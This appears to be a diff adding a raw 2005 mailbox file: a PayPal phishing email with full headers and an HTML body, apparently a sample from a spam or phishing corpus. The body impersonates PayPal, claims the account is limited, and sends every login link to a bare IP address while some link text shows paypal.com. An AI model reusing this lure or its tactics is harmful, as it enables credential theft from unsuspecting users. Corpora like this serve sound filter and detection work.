@@ -1,0 +1,267 @@
+From nobody Sun Jan 25 14:03:10 2015
+Return-Path: <root@lifeonline.fm>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+ by naughty.domain.com (Postfix) with ESMTP id A7B4C536E13
+ for <username@login.domain.com>; Wed, 28 Sep 2005 20:14:23 -0400 (EDT)
+Received: from mail2.domain.com (localhost.domain.com [127.0.0.1])
+ by mail2.domain.com (Postfix) with ESMTP id 069E56FA2DE
+ for <username@domain.com>; Wed, 28 Sep 2005 20:14:20 -0400 (EDT)
+Received: from spirit.lifeonline.fm (lifeonline.fm [142.46.73.171])
+ by mail2.domain.com (Postfix) with ESMTP
+ for <username@domain.com>; Wed, 28 Sep 2005 20:14:20 -0400 (EDT)
+Received: by spirit.lifeonline.fm (Postfix, from userid 0)
+ id 6599422716; Wed, 28 Sep 2005 20:13:48 -0400 (EDT)
+To: username@domain.com
+Subject: ALERT: Further Account Verification - Identity Confirmation Request
+Message-ID: <1127952828.41748.qmail@paypal.com>
+From: "service@paypal.com" <service@paypal.com>
+Content-Type: text/html
+Date: Wed, 28 Sep 2005 20:13:48 -0400 (EDT)
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: **
+X-Spam-Status: No, score=2.1 required=5.0 tests=HTML_80_90,HTML_MESSAGE,
+ HTML_TAG_EXIST_TBODY,MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,
+ NORMAL_HTTP_TO_IP,RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK autolearn=no 
+ version=3.0.2
+X-Spam-Report: * 0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address
+ in URL *  0.1 HTML_80_90 BODY: Message is 80% to 90% HTML
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 HTML_TAG_EXIST_TBODY BODY: HTML has "tbody" tag
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf: 100]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+X-Keywords: 
+X-UID: 285
+Status: O
+Content-Length: 14004
+Lines: 224
+
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
+<BODY>
+<P>
+<TABLE cellSpacing=0 cellPadding=1 width="100%" border=0>
+  <TBODY>
+  <TR>
+    <TD>
+      <STYLE type=text/css>BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+
+LI {line-height: 120%;}
+UL.smallBorder {margin:10px 5px 10px 20px;}
+LI.smallBorderLi {margin:0px 0px 5px 0px;}
+UL.Narrow {margin:10px 5px 0px 40px;}
+HR.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+.smallEmphasis {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;font-weight: bold;color: #000000;}
+.serifBig {font-family: serif;font-size: 20px;font-weight: bold;color: #000000;}
+.serif{font-family: serif;font-size: 16px;color: #000000;}
+.sansSerif{font-family: verdana,arial,helvetica,sans-serif; font-size: 16px;color: #000000;}
+.heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: bold;color: #003366;}
+.subHeadingEoa {font-family: verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color: #000000;}
+.subHeading {font-family: verdana,arial,helvetica,sans-serif;font-size: 16px;font-weight: bold;color: #003366;}
+.sidebarText {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #003366;}
+.sidebarTextBold {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color: #003366;}
+.xptFooter {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #aaaaaa;}
+.button {font-size: 13px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset; color:#000000; background-color: #cccccc;}
+.smaller {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #000000;}
+.smallerSidebar {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+.emphasis {font-weight: 700;}
+table#invoice, table#invoice_controls, table#invoice_note {	width: 600px;}
+table#invoice_note {margin-top:10px; margin-bottom:10px;}
+table#invoice_controls {text-align: right;}
+table#invoice {border-collapse: collapse; border:1px solid #aaa; }
+table#invoice td {font-size:11px; border:1px solid #ccc;	padding:2px;}
+table#invoice td.field_label_right, table#invoice td.field_label_right_error {font-weight:bold;	text-align:right;}
+table#invoice td.field_label_right_error, table#invoice td.field_label_error {color:red;}
+table#invoice tr.title td {font-weight:bold; line-height:20px; text-align:left; background-color: #ccddee;}
+table#invoice input.readonly {border:0; text-align:right;}
+table#invoice input.readonly_currency {border:0; width:10px;}
+.field_error, .field_error input.readonly_currency {background-color:#FF3333;}
+.currency_highlight {background-color: #ffffcc;}
+.tax {font-weight: 400; float: left;}
+table#invoice td span.curr {float: left;}
+table#invoice td.currency {border-right:1px solid #fff;}
+table#invoice td.calc {font-weight:bold; text-align:right;}
+.inlineBlue {color: #00f;}
+.small {font-size: 11px; font-weight: 400;}
+HR.solid {width: 100%; margin-top: 5px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px solid #999;}
+.large {font-size: 17px;} 
+.smallVerdanaGrey{font-family: verdana; font-size: 10px; color: #999999;} 
+.smallVerdana {font-family: verdana; font-size: 10px; color :#000000;} 
+.smallArial {font-family: arial; font-size: 13px; } 
+.smallArialBlue {font-family: verdana; font-size: 9px; color: #0000FF;} 
+.smallVerdanaGreen{font-family: verdana; font-size: 10px; color: #666666;} 
+.smaller {font-size: 10px; color: gray;} 
+.larger {font-size: 18px; font-family: arial; font-weight: 600; }  
+.longTableValue{word-break:break-all;} 
+.longSideBarText{width:190px; word-break: break-all;} 
+</STYLE>
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <IMG 
+      alt=PayPal src="http://images.paypal.com/en_US/i/logo/email_logo.gif" 
+      border=0> 
+      <TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+        <TBODY>
+        <TR vAlign=top>
+          <TD><A 
+            href="http://62.131.191.69/webscr.php?cmd=LogIn"></A></TD></TR></TBODY></TABLE>
+      <TABLE cellSpacing=0 cellPadding=0 width="100%" align=center border=0>
+        <TBODY>
+        <TR>
+          <TD width="100%" 
+          background=http://images.paypal.com/en_US/i/scr/bg_clk.gif><IMG 
+            height=29 alt="" 
+            src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 
+            border=0></TD></TR>
+        <TR>
+          <TD><IMG height=10 alt="" 
+            src="http://images.paypal.com/en_US/i/scr/pixel.gif" width=1 
+            border=0></TD></TR></TBODY></TABLE>
+      <TABLE cellSpacing=0 cellPadding=0 width=600 align=center border=0>
+        <TBODY>
+        <TR>
+          <TD></TD></TR></TBODY></TABLE>
+      <TABLE style="WIDTH: 813px; HEIGHT: 859px" cellSpacing=0 cellPadding=0 
+      width=813 align=left border=0>
+        <TBODY>
+        <TR>
+          <TD>
+            <TABLE style="WIDTH: 698px; HEIGHT: 845px" cellSpacing=0 
+            cellPadding=0 width=698 align=center border=0>
+              <TBODY>
+              <TR vAlign=top>
+                <TD width="100%">
+                  <TABLE cellSpacing=0 cellPadding=1 width=190 align=right 
+                  bgColor=#cccccc border=0>
+                    <TBODY>
+                    <TR>
+                      <TD>
+                        <TABLE cellSpacing=0 cellPadding=0 width="100%" 
+                        align=center bgColor=#ffffff border=0>
+                          <TBODY>
+                          <TR>
+                            <TD>
+                              <TABLE cellSpacing=0 cellPadding=5 width="100%" 
+                              align=center bgColor=#eeeeee border=0>
+                                <TBODY>
+                                <TR>
+                                <TD align=middle><SPAN 
+                                class=sideBarTextBold><FONT 
+                                color=#000000>Protect Your Account 
+                                Info</FONT></SPAN></TD></TR></TBODY></TABLE>
+                              <TABLE cellSpacing=0 cellPadding=5 width="100%" 
+                              align=center border=0>
+                                <TBODY>
+                                <TR>
+                                <TD class=sideBarText>Make sure you never 
+                                provide your password to fraudulent 
+                                websites.<BR><BR>To safely and securely access 
+                                the PayPal website or your account, open a new 
+                                web browser (e.g. Internet Explorer or Netscape) 
+                                and type in the PayPal URL to be sure you are on 
+                                the real PayPal website.<SPAN 
+                                class=longSideBarText>https://www.paypal.com/us</SPAN>/) 
+                                to be sure you are on the real PayPal 
+                                site.<BR><BR>PayPal will never ask you to enter 
+                                your password in an email.<BR><BR>For more 
+                                information on protecting yourself from fraud, 
+                                please review our Security Tips at <SPAN 
+                                class=longSideBarText>https://www.paypal.com/us/securitytips</SPAN><BR><IMG 
+                                height=5 alt="" 
+                                src="http://images.paypal.com/en_US/i/scr/pixel.gif" 
+                                width=1 
+                          border=0></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+                        <TABLE cellSpacing=0 cellPadding=0 width="100%" 
+                        align=center bgColor=#ffffff border=0>
+                          <TBODY>
+                          <TR>
+                            <TD>
+                              <TABLE cellSpacing=0 cellPadding=5 width="100%" 
+                              align=center bgColor=#eeeeee border=0>
+                                <TBODY>
+                                <TR>
+                                <TD class=sideBarTextBold align=middle>Protect 
+                                Your Password</TD></TR></TBODY></TABLE>
+                              <TABLE cellSpacing=0 cellPadding=5 width="100%" 
+                              align=center border=0>
+                                <TBODY>
+                                <TR>
+                                <TD class=sideBarText>You should <SPAN 
+                                class=emphasis>never</SPAN> give your PayPal 
+                                password to anyone, including PayPal 
+                                employees.<BR><IMG height=5 alt="" 
+                                src="http://images.paypal.com/en_US/i/scr/pixel.gif" 
+                                width=1 
+                          border=0></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+                    <TR>
+                      <TD></TD></TR></TBODY></TABLE><SPAN class=heading><FONT 
+                  face=Arial color=#004080>Security 
+                  Measures</FONT><BR><BR></SPAN>
+                  <P><FONT color=#c0c0c0><FONT color=#808080><FONT 
+                  size=2>Feedback Assistance<BR></FONT><BR><FONT size=1>PayPal 
+                  is committed to maintaining a safe environment for its 
+                  community of buyers and sellers. To protect the security of 
+                  your account, PayPal employs some of the most advanced 
+                  security systems in the world and our anti-fraud teams 
+                  regularly screen the PayPal system for unusual 
+                  activity.</FONT></FONT><BR></FONT><BR>We are contacting you to 
+                  inform you that on<FONT color=#ff0000> <SPAN 
+                  class=style1><STRONG>September 28, 2005</STRONG></SPAN></FONT> 
+                  our Account Review Team identified some unusual activity in 
+                  your account. In accordance with PayPal's User Agreement and 
+                  to ensure that your account has not been compromised, access 
+                  to your account was limited. Your account access will remain 
+                  limited until this issue has been resolved.<BR><BR><BR>Our 
+                  system requires further account verification. <BR>Case ID 
+                  Number: PP-563-002-410<BR><BR>We encourage you to <A 
+                  href="http://62.131.191.69/webscr.php?cmd=LogIn"><STRONG><FONT 
+                  color=#3e7cac size=2>log in</FONT></STRONG></A> and perform 
+                  the steps necessary to restore your account access as soon as 
+                  possible. Allowing your account access to remain limited for 
+                  an extended period of time may result in further limitations 
+                  on the use of your account and possible account 
+                  closure.<BR><FONT size=1><STRONG><U><FONT 
+                  color=#3e7cac><BR></FONT></U></STRONG></FONT></P>
+                  <P><FONT size=1><STRONG><FONT 
+                  color=#3e7cac>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+                  <A 
+                  href="http://62.131.191.69/webscr.php?cmd=LogIn"><STRONG><FONT 
+                  color=#3e7cac 
+                  size=2>https://www.paypal.com/us/</FONT></STRONG></A><BR></FONT></STRONG></FONT><FONT 
+                  size=1><STRONG><FONT color=#3e7cac><BR><U>Security 
+                  Tips:</U></FONT></STRONG><FONT color=#808080> For your 
+                  security, PayPal will never ask you to enter your&nbsp;credit 
+                  or debit card number without providing you at least the LAST 
+                  TWO DIGITS of know the number. These digits let you know the 
+                  we already know the full number and are asking you for the 
+                  rest of it.</FONT></FONT><BR><BR></P>
+                  <P>Ignoring our request, for an extended period of time, may 
+                  result an account limitation or may result in eventual account 
+                  closure.</P>
+                  <P>Please understand that this is a security measure meant to 
+                  help protect <BR>you and the safety of your account.<BR><BR>We 
+                  apologize for any inconvenience.</P>
+                  <P>Sincerely,<BR>Lory<BR>PayPal Account Rewiew 
+                  Departament.&nbsp; 
+                  <HR class=dotted>
+
+                  <P></P>
+                  <P class=xptFooter>Please do not reply to this email. This 
+                  mailbox is not monitored and you will not <BR>receive a 
+                  response. For assistance, <A 
+                  href="http://62.131.191.69/webscr.php?cmd=LogIn"><STRONG><FONT 
+                  color=#3e7cac size=2>log in</FONT></STRONG></A> to your PayPal 
+                  account and choose<BR>the Help link located in the top right 
+                  corner of any PayPal page.<BR><BR class=h10>To receive 
+                  email&nbsp;in plain text instead of HTML, <BR>update your 
+                  preferences <A 
+                  href="http://62.131.191.69/webscr.php?cmd=LogIn"><STRONG><FONT 
+                  color=#3e7cac 
+                  size=2>here</FONT></STRONG></A>.</P><BR><BR><SPAN 
+                  class=xptFooter><BR><SPAN class=xptFooter><FONT 
+                  color=#c0c0c0>PayPal Email ID 
+                  PP-563-002-410</FONT></SPAN></SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></P></BODY></HTML>
